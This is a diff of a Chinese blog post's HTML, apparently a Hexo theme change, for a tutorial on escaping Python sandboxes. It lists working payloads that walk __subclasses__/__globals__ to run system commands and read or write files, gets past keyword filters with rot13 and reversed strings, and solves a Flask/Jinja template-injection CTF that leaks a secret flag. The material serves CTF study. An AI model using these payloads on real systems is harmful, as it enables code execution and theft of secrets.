@@ -1,214 +1,177 @@
-
 <!DOCTYPE html>
 <html lang="zh-cn">
-    
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="generator" content="Hexo">
-    <title>python沙盒逃逸two - Hexo</title>
-    <meta name="author" content="John Doe">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="p1k">
     
-    
-    
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"特殊方法先学习几个方法\ngetattr __getattribute__  __init__  __globals__  __call__  f修饰符\n\n\nf修饰符12&gt;&gt;&gt; f'&#123;__import__(\"os\").system(\"ls\")&#125;'11.py  视频  下载\n\ngetattr(self,attr)触发条件：当获取不存在的对象成员时触发\n参数：self 接收当前对象 attr获取成员名称的字符串\n返回值：必须有值\n作用：为访问不存在的属性设置值\n __getattribute__ 无论何时都会在getattr()之前触发，如果 __getattribute__ 有返回值，就不会在触发getattr()\n__getattribute__ (self,attr)触发条件：调用对象成员时触发，无论是否存在\n参数：同getattr\n返回值：必须有值\n作用：在具有封装操作(私有化时)，为程序开部分访问权限使用\n__init__类实例创建后调用，用于实例化当前实例的一些属性\n__globals__以字典的形式返回函数所在的全局命名空间所定义的全局变量，和func_globals 功能差不多(就是返回当前空间下，能使用的模块，方法，属性的字典)\n__call__使实例能够像函数一样被调用\n__class__获取该实例所属的类\n__mro__返回类的继承顺序，元组形式\n1234&gt;&gt;&gt; ''.__class__.__mro__(&lt;type 'str'&gt;, &lt;type 'basestring'&gt;, &lt;type 'object'&gt;)&gt;&gt;&gt; ''.__class__.__mro__[-1]&lt;type 'object'&gt;\n\n__base__  __bases__获取该类所属的基类\n12345678&gt;&gt;&gt; &apos;&apos;.__class__.__base__&lt;type &apos;basestring&apos;&gt;&gt;&gt;&gt; [].__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; [].__class__.__bases__(&lt;type &apos;object&apos;&gt;,)&gt;&gt;&gt; [].__class__.__bases__[0]&lt;type &apos;object&apos;&gt;\n\n函数名被过滤可以利用getattr getattribute + 编码绕过\n123456789&gt;&gt;&gt; __import__('os').__getattribute__('flfgrz'.encode('rot13'))('ls')11.py  视频  下载放几个payloadgetattr(__import__(\"os\"),'flfgrz'.encode('rot13'))('ls')getattr(__import__('os'),'metsys'[::-1])('ls')__import__('os').__getattribute__('metsys'[::-1])('ls')\n\n继承链1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__&lt;unbound method catch_warnings.__init__&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache']&lt;module 'linecache' from '/usr/lib/python2.7/linecache.pyc'&gt;\n\n来个脚本跑一下，能拿到更多的payload\n123456789101112131415#coding:utf-8search = 'os'   #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__():    num += 1    try:        if search in i.__init__.__globals__.keys():            print(i, num)    except:        pass \"\"\"(&lt;class 'site._Printer'&gt;, 72)(&lt;class 'site.Quitter'&gt;, 77)\"\"\"\n\n放几个payload python2.x\n12345678910111213141516171819202122# 利用file()函数读取文件：（写类似）().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()# 执行系统命令：().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].os.system('ls')# 执行系统命令：().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").system(\"ls\")')# 重新载入__builtins__：().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__'](\"os\").system(\"ls\")#读文件().__class__.__bases__[0].__subclasses__()[40](r'C:\\1.php').read()#写文件().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')#执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(\"os\").popen(\"ls  /var/www/html\").read()' )# 利用 __getattibute__ 方法x = [x for x in [].__class__.__base__.__subclasses__() if x.__name__ == 'ca'+'tch_warnings'][0].__init__x.__getattribute__(\"func_global\"+\"s\")['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('l'+'s')\n\npython3 \n1234567().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__['system']('ls')().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[\"sys\"].modules[\"os\"].system(\"ls\")''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[\"sys\"].modules[\"os\"].system(\"ls\")[].__class__.__base__.__subclasses__()[127].__init__.__globals__['system']('ls')\n\neg一道ctf记录\n1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index():    return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine):    def safe_jinja(s):        s = s.replace('(', '').replace(')', '')        blacklist = ['config', 'self']        return ''.join(['&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'.format(c) for c in blacklist]) + s    return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__':    app.run(debug=True)\n\n注入点在路径 /shrine/&lt;path:shrine&gt;\n过滤了()  并且把config self置为空\n要是没被处理 可以用\n1234567# confighttp://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;config&#125;&#125;# self# &#123;&#123;self&#125;&#125; =&gt; &lt;TemplateReference None&gt;http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;self.__dict__&#125;&#125;# ()http://shrine.chal.ctf.westerns.tokyo/shrine/&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']&#125;&#125;\n\npayload\n123/shrine/&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125;/shrine/&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125;\n\n参考链接\nhttps://juejin.im/post/5a3de02af265da432653098d\nhttps://xz.aliyun.com/t/2308#toc-4\nhttps://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#i-7\n","dateCreated":"2019-09-13T21:35:24+08:00","dateModified":"2019-11-20T21:24:33+08:00","datePublished":"2019-09-13T21:35:24+08:00","description":"特殊方法先学习几个方法\ngetattr __getattribute__  __init__  __globals__  __call__  f修饰符","headline":"python沙盒逃逸two","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/09/13/python沙盒逃逸two/"}</script>
-    <meta name="description" content="特殊方法先学习几个方法 getattr __getattribute__  __init__  __globals__  __call__  f修饰符">
-<meta property="og:type" content="blog">
-<meta property="og:title" content="python沙盒逃逸two">
-<meta property="og:url" content="http://p1keman.github.io/2019/09/13/python沙盒逃逸two/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="特殊方法先学习几个方法 getattr __getattribute__  __init__  __globals__  __call__  f修饰符">
-<meta property="og:locale" content="zh-cn">
-<meta property="og:updated_time" content="2019-11-20T13:24:33.154Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="python沙盒逃逸two">
-<meta name="twitter:description" content="特殊方法先学习几个方法 getattr __getattribute__  __init__  __globals__  __call__  f修饰符">
-    
-    
+    <title>
         
-    
-    
-    
-    
-    
-    <!--STYLES-->
-    <link rel="stylesheet" href="/assets/css/style-6tgl0yz7lnfzkusrxanjzjinweinxlhwhjly7phr1vxoylo39j7uvbjbwsfg.min.css">
-    <!--STYLES END-->
-    
-
-    
-
-    
+            python沙盒逃逸two |
         
+        p1k&#39;s blog
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
     
-</head>
-
-    <body>
-        <div id="blog">
-            <!-- Define author's picture -->
-
+<link rel="stylesheet" href="/css/style.css">
 
     
+<link rel="stylesheet" href="/css/font-awesome.min.css">
 
-<header id="header" data-behavior="4">
-    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
-    <div class="header-title">
-        <a
-            class="header-title-link"
-            href="/ "
-            aria-label=""
-        >
-            Hexo
-        </a>
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"p1keman.github.io","root":"/","language":"zh-cn"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"SBJ is SB."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.3.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                p1k&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
     </div>
-    
-        
-            <a
-                class="header-right-picture "
-                href="#about"
-                aria-label="打开链接: /#about"
-            >
-        
-        
-        </a>
-    
-</header>
 
-            <!-- Define author's picture -->
-
-
-<nav id="sidebar" data-behavior="4">
-    <div class="sidebar-container">
-        
-        
-            <ul class="sidebar-buttons">
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/"
-                            
-                            rel="noopener"
-                            title="首页"
-                        >
-                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">首页</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-categories"
-                            
-                            rel="noopener"
-                            title="分类"
-                        >
-                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">分类</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
             
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-tags"
-                            
-                            rel="noopener"
-                            title="标签"
-                        >
-                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">标签</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/all-archives"
-                            
-                            rel="noopener"
-                            title="归档"
-                        >
-                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">归档</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link open-algolia-search"
-                            href="#search"
-                            
-                            rel="noopener"
-                            title="搜索"
-                        >
-                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">搜索</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="#about"
-                            
-                            rel="noopener"
-                            title="关于"
-                        >
-                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">关于</span>
-                    </a>
-            </li>
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
             
         </ul>
-        
     </div>
-</nav>
 
-            
-            <div id="main" data-behavior="4"
-                 class="
-                        hasCoverMetaIn
-                        ">
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content normal-code-theme">
+
                 
-<article class="post">
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">python沙盒逃逸two</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">p1k</span>
+                        <span class="level">Lv6</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i> 2019-09-13 21:35:24
+    </span>
     
     
-        <div class="post-header main-content-wrap text-left">
-    
-        <h1 class="post-title">
-            python沙盒逃逸two
-        </h1>
+
     
     
-        <div class="post-meta">
-    <time datetime="2019-09-13T21:35:24+08:00">
-	
-		    9月 13, 2019
-    	
-    </time>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
     
 </div>
 
-    
-</div>
+                    </div>
+                </div>
+            </div>
+        
 
-    
-    <div class="post-content markdown">
-        <div class="main-content-wrap">
+        <div class="article-content markdown-body">
             <h2 id="特殊方法"><a href="#特殊方法" class="headerlink" title="特殊方法"></a>特殊方法</h2><p>先学习几个方法</p>
 <p>getattr __getattribute__  __init__  __globals__  __call__  f修饰符</p>
 <a id="more"></a>
 
-<h3 id="f修饰符"><a href="#f修饰符" class="headerlink" title="f修饰符"></a>f修饰符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f'<span class="subst">&#123;__import__(<span class="string">"os"</span>).system(<span class="string">"ls"</span>)&#125;</span>'</span></span><br><span class="line"><span class="number">11.</span>py  视频  下载</span><br></pre></td></tr></table></figure>
-
+<h3 id="f修饰符"><a href="#f修饰符" class="headerlink" title="f修饰符"></a>f修饰符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line"><span class="number">11.</span>py  视频  下载</span><br></pre></td></tr></table></figure>
 <h3 id="getattr-self-attr"><a href="#getattr-self-attr" class="headerlink" title="getattr(self,attr)"></a>getattr(self,attr)</h3><p>触发条件：当获取不存在的对象成员时触发</p>
 <p>参数：self 接收当前对象 attr获取成员名称的字符串</p>
 <p>返回值：必须有值</p>
@@ -223,350 +186,261 @@
 <h3 id="call"><a href="#call" class="headerlink" title="__call__"></a>__call__</h3><p>使实例能够像函数一样被调用</p>
 <h3 id="class"><a href="#class" class="headerlink" title="__class__"></a>__class__</h3><p>获取该实例所属的类</p>
 <h3 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a>__mro__</h3><p>返回类的继承顺序，元组形式</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__</span><br><span class="line">(&lt;type <span class="string">'str'</span>&gt;, &lt;type <span class="string">'basestring'</span>&gt;, &lt;type <span class="string">'object'</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">''</span>.__class__.__mro__[<span class="number">-1</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
 <h3 id="base-bases"><a href="#base-bases" class="headerlink" title="__base__  __bases__"></a>__base__  __bases__</h3><p>获取该类所属的基类</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__base__</span><br><span class="line">&lt;type &apos;basestring&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__</span><br><span class="line">(&lt;type &apos;object&apos;&gt;,)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__[0]</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;&#39;.__class__.__base__</span><br><span class="line">&lt;type &#39;basestring&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &#39;object&#39;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__</span><br><span class="line">(&lt;type &#39;object&#39;&gt;,)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__[0]</span><br><span class="line">&lt;type &#39;object&#39;&gt;</span><br></pre></td></tr></table></figure>
 <h2 id="函数名被过滤"><a href="#函数名被过滤" class="headerlink" title="函数名被过滤"></a>函数名被过滤</h2><p>可以利用getattr getattribute + 编码绕过</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__import__(<span class="string">'os'</span>).__getattribute__(<span class="string">'flfgrz'</span>.encode(<span class="string">'rot13'</span>))(<span class="string">'ls'</span>)</span><br><span class="line"><span class="number">11.</span>py  视频  下载</span><br><span class="line"></span><br><span class="line">放几个payload</span><br><span class="line">getattr(__import__(<span class="string">"os"</span>),<span class="string">'flfgrz'</span>.encode(<span class="string">'rot13'</span>))(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">getattr(__import__(<span class="string">'os'</span>),<span class="string">'metsys'</span>[::<span class="number">-1</span>])(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">'os'</span>).__getattribute__(<span class="string">'metsys'</span>[::<span class="number">-1</span>])(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).__getattribute__(<span class="string">&#x27;flfgrz&#x27;</span>.encode(<span class="string">&#x27;rot13&#x27;</span>))(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="number">11.</span>py  视频  下载</span><br><span class="line"></span><br><span class="line">放几个payload</span><br><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>),<span class="string">&#x27;flfgrz&#x27;</span>.encode(<span class="string">&#x27;rot13&#x27;</span>))(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">getattr</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>),<span class="string">&#x27;metsys&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).__getattribute__(<span class="string">&#x27;metsys&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
-<h2 id="继承链"><a href="#继承链" class="headerlink" title="继承链"></a>继承链</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__</span><br><span class="line">&lt;unbound method catch_warnings.__init__&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>]</span><br><span class="line">&lt;module <span class="string">'linecache'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python2.7/linecache.pyc'</span>&gt;</span><br></pre></td></tr></table></figure>
 
+<h2 id="继承链"><a href="#继承链" class="headerlink" title="继承链"></a>继承链</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__</span><br><span class="line">&lt;unbound method catch_warnings.__init__&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>]</span><br><span class="line">&lt;module <span class="string">&#x27;linecache&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/lib/python2.7/linecache.pyc&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>来个脚本跑一下，能拿到更多的payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'os'</span>   <span class="comment">#也可以是其他你想利用的模块</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">(&lt;class 'site._Printer'&gt;, 72)</span></span><br><span class="line"><span class="string">(&lt;class 'site.Quitter'&gt;, 77)</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;os&#x27;</span>   <span class="comment">#也可以是其他你想利用的模块</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">(&lt;class &#x27;site._Printer&#x27;&gt;, 72)</span></span><br><span class="line"><span class="string">(&lt;class &#x27;site.Quitter&#x27;&gt;, 77)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
 <p>放几个payload python2.x</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 利用file()函数读取文件：（写类似）</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./test.py'</span>).read()</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 __getattibute__ 方法</span></span><br><span class="line"></span><br><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br></pre></td></tr></table></figure>
-
